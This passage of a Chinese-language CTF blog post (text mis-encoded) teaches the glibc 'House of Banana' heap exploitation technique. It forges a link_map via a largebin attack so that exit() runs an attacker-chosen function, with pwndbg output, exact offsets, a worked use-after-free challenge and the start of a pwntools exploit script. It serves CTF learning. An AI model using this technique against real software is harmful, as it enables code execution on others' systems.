_ns_global_scope_alloc = 0,                                                                                      </span><br><span class="hljs-template-variable">      ...</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“é•¿è¿™ä¸ªæ ·å­ï¼Œå¤ªé•¿äº†æˆ‘ä»¬å°±ç›´å‡»é‡ç‚¹ï¼Œå°±æ˜¯æˆ‘æ³¨é‡Šçš„åœ°æ–¹</p><p>_ns_loaded &#x3D;0x7b20b1a2b170ï¼Œè¿™ä¸ªåœ°æ–¹å°±æ˜¯ä¸Šé¢è¯´çš„link_mapé“¾è¡¨å¤´çš„ä½ç½®ï¼Œåé¢çš„ns_nloaded &#x3D; 4ï¼Œè¿™ä¸ªä»£è¡¨é“¾è¡¨çš„èŠ‚ç‚¹ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯æœ‰å‡ ä¸ªè¿™æ ·çš„é“¾è¡¨ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ä¸å¯ä»¥å°äº4çš„ï¼Œä¸ç„¶å°±ç»•ä¸è¿‡æ£€æŸ¥äº†</p><p>æˆ‘ä»¬å…ˆè¿›å»link_mapç»“æ„ä½“çœ‹çœ‹</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg&gt; p *(struct link_map *) <span class="hljs-number">0</span>x7b20b1a2b170         <br>$<span class="hljs-number">2</span> = &#123;                                                <br>  <span class="hljs-attr">l_addr</span> = <span class="hljs-number">102030429388800</span>,                           <br>  <span class="hljs-attr">l_name</span> = <span class="hljs-number">0</span>x7b20b1a2b700 <span class="hljs-string">&quot;&quot;</span>,                         <br>  <span class="hljs-attr">l_ld</span> = <span class="hljs-number">0</span>x5ccbcfa03000,                              <br>  <span class="hljs-attr">l_next</span> = <span class="hljs-number">0</span>x7b20b1a2b710,      <span class="hljs-comment">#æŒ‡å‘ä¸‹ä¸€ä¸ªlink_mapç»“æ„ä½“çš„åœ°å€                      </span><br>  <span class="hljs-attr">l_prev</span> = <span class="hljs-number">0</span>x0,                                       <br>  <span class="hljs-attr">l_real</span> = <span class="hljs-number">0</span>x7b20b1a2b170,      <span class="hljs-comment">#æŒ‡å‘è‡ªèº«çš„åœ°å€                      </span><br>  <span class="hljs-attr">l_ns</span> = <span class="hljs-number">0</span>,                                           <br>  <span class="hljs-attr">l_libname</span> = <span class="hljs-number">0</span>x7b20b1a2b6e8,     <br>  ....<br>  <span class="hljs-attr">l_direct_opencount</span> = <span class="hljs-number">1</span>,             <br>  <span class="hljs-attr">l_type</span> = lt_executable,             <br>  <span class="hljs-attr">l_relocated</span> = <span class="hljs-number">1</span>,                    <br>  <span class="hljs-attr">l_init_called</span> = <span class="hljs-number">1</span>,                  <br>  <span class="hljs-attr">l_global</span> = <span class="hljs-number">1</span>,                       <br>  <span class="hljs-attr">l_reserved</span> = <span class="hljs-number">0</span>,                     <br>  <span class="hljs-attr">l_phdr_allocated</span> = <span class="hljs-number">0</span>,               <br>  <span class="hljs-attr">l_soname_added</span> = <span class="hljs-number">0</span>,                 <br>  <span class="hljs-attr">l_faked</span> = <span class="hljs-number">0</span>,                        <br>  <span class="hljs-attr">l_need_tls_init</span> = <span class="hljs-number">0</span>,                <br>  <span class="hljs-attr">l_auditing</span> = <span class="hljs-number">0</span>,                     <br>  <span class="hljs-attr">l_audit_any_plt</span> = <span class="hljs-number">0</span>,                <br>  <span class="hljs-attr">l_removed</span> = <span class="hljs-number">0</span>,                      <br>  <span class="hljs-attr">l_contiguous</span> = <span class="hljs-number">0</span>,                   <br>  <span class="hljs-attr">l_symbolic_in_local_scope</span> = <span class="hljs-number">0</span>,      <br>  <span class="hljs-attr">l_free_initfini</span> = <span class="hljs-number">0</span>,                <br></code></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹l_next &#x3D; 0x7ffff7e2b710è¿™ä¸€å¥ï¼Œè¿™ä¸€å¥æŒ‡å‘çš„æ˜¯ä¸‹ä¸€ä¸ªlink_map,ç„¶åæ˜¯ l_real &#x3D; 0x7f56e43ba220 ï¼Œ æŒ‡å‘çš„è‡ªèº«çš„åœ°å€ï¼Œè¿™é‡Œä¹Ÿæ˜¯åé¢éœ€è¦æ£€æŸ¥çš„åœ°æ–¹ã€‚l_init_called &#x3D; 1ï¼Œ ç®€å•è¯´ï¼Œå°±æ˜¯ä¸ºäº†ç»•è¿‡æ£€æŸ¥ã€‚</p><p>æˆ‘ä»¬å…ˆæ€»ç»“ä¸€ä¸‹ç°åœ¨çŸ¥é“ä»€ä¹ˆï¼Œé¦–å…ˆï¼Œhouse of bananaçš„åˆ©ç”¨åŸºç¡€å°±æ˜¯åœ¨äºä¼ªé€ _rtld_globaç»“æ„ä½“é‡Œé¢ç”¨ns_loadedæ‰€è¿æ¥çš„å››ä¸ªlink_mapç»“æ„ä½“ï¼Œæœ€ç»ˆæ˜¯åœ¨äºlink_mapé‡Œé¢ï¼Œä¼ªé€ å…¶ä¸­çš„ä¸€äº›æ•°æ®ï¼Œæœ€ç»ˆæ‰§è¡Œ((fini_t) array[i]) ()</p><p>æœ€å¼€å§‹çš„åˆ©ç”¨å…¶å®æ˜¯åŸºäºç¬¬ä¸€ä¸ªlink_mapç»“æ„ä½“ï¼Œä½†æ˜¯é‚£æ ·éœ€è¦ä¼ªé€ å››ä¸ªï¼Œå¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥ä¼ªé€ ç¬¬ä¸‰ä¸ªlink_mapçš„_ns_loadedï¼ŒæŠŠè¿™ä¸ªæ•°æ®æ”¹æˆæˆ‘ä»¬ä¼ªé€ çš„å †å—ï¼Œåœ¨å †å—é‡Œé¢ä¼ªé€ ç¬¬å››ä¸ªlink_map</p><h3 id="ç»•è¿‡ä¿æŠ¤"><a href="#ç»•è¿‡ä¿æŠ¤" class="headerlink" title="ç»•è¿‡ä¿æŠ¤"></a>ç»•è¿‡ä¿æŠ¤</h3><p>æ¥çœ‹çœ‹ä¿æŠ¤</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;</span>l_next)<br>        <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br><span class="hljs-comment">// -------------------check0--------------------------------</span><br>    <span class="hljs-function"><span class="hljs-title">if</span> (l == l-&gt;</span>l_real)<br><span class="hljs-comment">// -------------------check0--------------------------------</span><br>    &#123;<br>    assert (i &lt; nloaded);<br><br>    maps[i] = l;<br>    <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_idx = i;<br>    ++i;<br><br>    <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">        are not dlclose()ed from underneath us.  */</span><br>    ++<span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_direct_opencount;<br>    &#125;<br>assert (ns != LM_ID_BASE || i == nloaded);<br>assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬å¿…é¡»æœ‰å››ä¸ªlink_mapç»“æ„ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹çš„ä½ç½®ï¼Œä¼ªé€ ä»–çš„nextæ®µ</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">pwndbg</span>&gt; p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span>l_next)<br>$<span class="hljs-number">3</span> = (struct link_map **) <span class="hljs-number">0</span>x7ffff7ff7018<br></code></pre></td></tr></table></figure><p>åªè¦åœ¨gdbé‡Œé¢è¾“å…¥è¿™ä¸€è¡Œï¼Œå°±å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰ä¸ªç»“æ„ä½“çš„ä½ç½®ï¼Œè®¡ç®—å‡ºç›¸å¯¹äºlibcçš„åç§»</p><p>ä¸ºäº†ç»•è¿‡ä¸Šé¢çš„maps[i] &#x3D; lè¿™ä¸€è¡Œï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä¼ªé€ çš„ç»“æ„ä½“ï¼ˆå‡è®¾ä¼ªé€ çš„ç»“æ„ä½“ä¸ºfakeï¼‰åŠ ä¸Š0x28çš„ä½ç½®ä¸Šé¢å¡«ä¸Šè‡ªå·±çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯fake+0x28&#x3D;fake</p><p>å…¶æ¬¡</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xl">#define DT_FINI_ARRAY   <span class="hljs-number">26</span>      <span class="hljs-comment">/* Array with addresses of fini fct */</span><br>#define DT_FINI_ARRAYSZ <span class="hljs-number">28</span>      <span class="hljs-comment">/* Size in bytes of DT_FINI_ARRAY */</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>    &#123;<br>        struct link_map *l = maps[i];<br><span class="hljs-comment">// -------------------check1--------------------------------</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_init_called)<br><span class="hljs-comment">// -------------------check1--------------------------------</span><br>        &#123;<br>          <span class="hljs-comment">/* Make sure nothing happens if we are called twice.  */</span><br>          <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_init_called = <span class="hljs-number">0</span>;<br><br>          <span class="hljs-comment">/* Is there a destructor function?  */</span><br><span class="hljs-comment">// -------------------check2--------------------------------</span><br>          <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[<span class="hljs-number">26</span>] != NULL<br>              || <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_info[DT_FINI] != NULL)<br><span class="hljs-comment">// -------------------check2--------------------------------</span><br>            &#123;<br>                ....<br><br><span class="hljs-comment">// -------------------check3--------------------------------</span><br>                <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[<span class="hljs-number">26</span>] != NULL)<br><span class="hljs-comment">// -------------------check3--------------------------------</span><br>                &#123;<br>                    <span class="hljs-function"><span class="hljs-title">array</span> = (l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_addr</span> + l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[26]-&gt;</span>d_un.d_ptr);<br><br>                    <span class="hljs-function"><span class="hljs-title">i</span> = (l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[28]-&gt;</span>d_un.d_val / <span class="hljs-number">8</span>));<br><br>                    <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>                        ((fini_t) array[i]) ();<br>                &#125;<br>                ...<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä½ç½®ä¹Ÿæ˜¯æœ‰æ£€æŸ¥çš„ï¼Œå¯¹äºcheck1ï¼Œl-&gt;l_init_calledï¼Œè¿™ä¸ªä½ç½®å…¶å®æ˜¯è¦å¤§äº8çš„ï¼Œä½†æ˜¯å…·ä½“çš„å€¼éœ€è¦æŸ¥ä¸€ä¸‹ï¼Œå› ä¸ºå„ä¸ªç‰ˆæœ¬å†…å®¹ä¸åŒ</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">pwndbg&gt; <span class="hljs-built_in">distance</span> <span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_ns</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">_ns_loaded</span>  &amp;(<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_ns</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">_ns_loaded</span>)-&gt;l_init_called<br><span class="hljs-number">0</span>x7ffff7e2b170-&gt;<span class="hljs-number">0</span>x7ffff7e2b484 is <span class="hljs-number">0</span>x314 bytes (<span class="hljs-number">0</span>x62 words)<br>pwndbg&gt; x/wx &amp;(<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_ns</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">_ns_loaded</span>)-&gt;l_init_called<br><span class="hljs-number">0</span>x7ffff7e2b484: <span class="hljs-number">0</span>x0000001c<br></code></pre></td></tr></table></figure><p>å¯ä»¥è¾“å…¥è¿™ä¸¤è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æˆ‘ä»¬çš„fake+0x314çš„ä½ç½®å¡«ä¸Š0x1cå³å¯</p><p>å¯¹äºcheck2å’Œ3ï¼Œåªéœ€l-&gt;l_info[DT_FINI_ARRAY] !&#x3D; NULL ä¾¿å¯ç»•è¿‡</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">pwndbg&gt; distance  <span class="hljs-function"><span class="hljs-params">(_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)</span>  &amp;<span class="hljs-params">((_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">26</span>])</span></span><br><span class="hljs-function">0<span class="hljs-title">x7ffff7ffe168</span>-&gt;</span><span class="hljs-number">0x7ffff7ffe278</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x110</span> bytes (<span class="hljs-number">0x22</span> words)<br></code></pre></td></tr></table></figure><p>åœ¨fake+0x110 å†™å…¥çš„å†…å®¹ä¼šç›´æ¥æ§åˆ¶array</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">pwndbg&gt; distance  <span class="hljs-function"><span class="hljs-params">(_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)</span>  &amp;<span class="hljs-params">((_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">28</span>])</span></span><br><span class="hljs-function">0<span class="hljs-title">x7ffff7ffe168</span>-&gt;</span><span class="hljs-number">0x7ffff7ffe288</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x120</span> bytes (<span class="hljs-number">0x24</span> words)<br></code></pre></td></tr></table></figure><p>åœ¨fake+0x120å†™å…¥çš„å†…å®¹ä¼šæ§åˆ¶i</p><p>åªè¦æŠŠfake+0x120ï¼Œfake+0x110 æ§åˆ¶å¥½å°±å¯ä»¥æ§åˆ¶æœ€åçš„((fini_t) array[i]) ();è¿™æ˜¯æ­£å¸¸æ‰§è¡Œfini_arrayçš„æµç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç…§ç€æ­¤è¿›è¡Œä¼ªé€ ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x  *((_rtld_global<span class="hljs-number">.</span>_dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">26</span>]) <br><span class="hljs-number">$16</span> = &#123;<br>  d_tag = <span class="hljs-number">0x1a</span>, <br>  d_un = &#123;<br>    d_val = <span class="hljs-number">0x600e18</span>, <br>    d_ptr = <span class="hljs-number">0x600e18</span><br>  &#125;<br>&#125;<br>pwndbg&gt; p/x  ((_rtld_global<span class="hljs-number">.</span>_dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">26</span>])-&gt;d_un<span class="hljs-number">.</span>d_ptr<br><span class="hljs-number">$18</span> = <span class="hljs-number">0x600e18</span><br>pwndbg&gt; telescope <span class="hljs-number">0x600e18</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚   <span class="hljs-number">0x600e18</span> (__do_global_dtors_aux_fini_array_entry) â€”â–¸ <span class="hljs-number">0x400840</span> (__do_global_dtors_aux) â—‚â€” <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x200849</span>], <span class="hljs-number">0</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>â”‚   <span class="hljs-number">0x600e20</span> (__JCR_LIST__) â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>â”‚   <span class="hljs-number">0x600e28</span> (_DYNAMIC) â—‚â€” <span class="hljs-number">0x1</span><br>... â†“<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>â”‚   <span class="hljs-number">0x600e38</span> (_DYNAMIC+<span class="hljs-number">16</span>) â—‚â€” <span class="hljs-number">0xc</span> /* <span class="hljs-string">&#x27;\x0c&#x27;</span> */<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>â”‚   <span class="hljs-number">0x600e40</span> (_DYNAMIC+<span class="hljs-number">24</span>) â€”â–¸ <span class="hljs-number">0x400680</span> (_init) â—‚â€” <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>â”‚   <span class="hljs-number">0x600e48</span> (_DYNAMIC+<span class="hljs-number">32</span>) â—‚â€” <span class="hljs-number">0xd</span> /* <span class="hljs-string">&#x27;\r&#x27;</span> */<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>â”‚   <span class="hljs-number">0x600e50</span> (_DYNAMIC+<span class="hljs-number">40</span>) â€”â–¸ <span class="hljs-number">0x400b14</span> (_fini) â—‚â€” <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br>pwndbg&gt; p/x  *((_rtld_global<span class="hljs-number">.</span>_dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">28</span>]) <br><span class="hljs-number">$19</span> = &#123;<br>  d_tag = <span class="hljs-number">0x1c</span>, <br>  d_un = &#123;<br>    d_val = <span class="hljs-number">0x8</span>, <br>    d_ptr = <span class="hljs-number">0x8</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æ­£å¸¸æ‰§è¡Œæ—¶å€™çš„æµç¨‹ï¼Œå¯ä»¥æ€»ç»“ä¸€ä¸‹</p><p>å€Ÿç”¨cat03å¸ˆå‚…çš„æ€»ç»“</p><p>éœ€è¦åœ¨fake+0x110å†™å…¥ä¸€ä¸ªptrï¼Œä¸”ptr+0x8å¤„æœ‰ptr2ï¼Œptr2å¤„å†™å…¥çš„æ˜¯æœ€åè¦æ‰§è¡Œçš„å‡½æ•°åœ°å€.</p><p>éœ€è¦åœ¨fake+0x120å†™å…¥ä¸€ä¸ªptrï¼Œä¸”ptr+0x8å¤„æ˜¯i*8ã€‚</p><p>æˆ‘é€‰æ‹©çš„æ˜¯fake+0x110å†™å…¥fake+0x40ï¼Œåœ¨fake+0x48å†™å…¥fake+0x58ï¼Œåœ¨fake+0x58å†™å…¥shell</p><p>æˆ‘é€‰æ‹©åœ¨fake+0x120å†™å…¥fake+0x48ï¼Œåœ¨fake+0x50å¤„å†™å…¥8ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411052034875.png" alt="House of banana.drawio"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x28 = fake<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x48 = fake + <span class="hljs-number">0</span>x58<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x58 = shell<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x110 = fake + <span class="hljs-number">0</span>x40<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x120 = fake + <span class="hljs-number">0</span>x48<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x314 = <span class="hljs-number">0</span>x1c<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ä¼ªé€ link_mapçš„åŸºæœ¬æ–¹æ³•ï¼Œä½†æ˜¯ä½¿ç”¨ä¼ªé€ çš„å‰ææ˜¯éœ€è¦æŠŠlink_mapçš„nextæ”¹ä¸ºfakeï¼Œå¯ä»¥ç”¨largebin attack</p><p>âœ¨<strong>åœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œrtld_global_pträ¸libc_baseçš„åç§»åœ¨æœ¬åœ°ä¸è¿œç¨‹å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œå¯èƒ½ä¼šåœ¨åœ°å€çš„ç¬¬2å­—èŠ‚å¤„å‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤å¯ä»¥çˆ†ç ´256ç§å¯èƒ½å¾—åˆ°è¿œç¨‹ç¯å¢ƒçš„ç²¾ç¡®åç§»ã€‚</strong></p><p>è¿™é‡Œå¼•ç”¨ä¸€ä¸‹ctfshowçš„<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn212">poc</a></p><h2 id="ä¾‹é¢˜è®²è§£"><a href="#ä¾‹é¢˜è®²è§£" class="headerlink" title="ä¾‹é¢˜è®²è§£"></a>ä¾‹é¢˜è®²è§£</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/House%20of%20Banana">ä¾‹é¢˜ä¸‹è½½</a></p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>åŸºç¡€çš„èœå•é¢˜ï¼Œä¸»è¦ä»¥ç†Ÿæ‚‰House of Bananaä¸ºä¸»</p><p>addå‡½æ•°åˆ›å»ºå †æœ‰å¤§å°é™åˆ¶ä¸èƒ½åˆ›å»ºfast bin</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411052056446.png" alt="image-20241105205651356"></p><p>deleteå‡½æ•°å­˜åœ¨uafæ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411052058826.png" alt="image-20241105205832733"></p><p>è¿™é¢˜å­˜åœ¨exitå‡½æ•°ï¼Œé‚£æˆ‘ä»¬è¿›è¡ŒHouse of Bananaåˆä½“éªŒ</p><p>æ”»å‡»æ€è·¯ä¸ºï¼š</p><ol><li>å…ˆç”¨largebin attackæ”¹link_map3-&gt;nextçš„åœ°å€ä¸ºfake</li><li>è¿›è¡Œfakeçš„ä¼ªé€ </li><li>æ‰§è¡Œexitå‡½æ•°</li></ol><p>éœ€è¦å†æçš„ä¸€ç‚¹å°±æ˜¯å¯èƒ½éœ€è¦çˆ†ç ´ï¼Œå…³äºlargebin attackä¸‹æ¬¡å†è¯¦ç»†æ€»ç»“ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./pwn4&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.add</span><br><span class="hljs-string">2.show</span><br><span class="hljs-string">3.edit</span><br><span class="hljs-string">4.delete</span><br><span class="hljs-string">5.exit</span><br><span class="hljs-string">Your choice:</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>  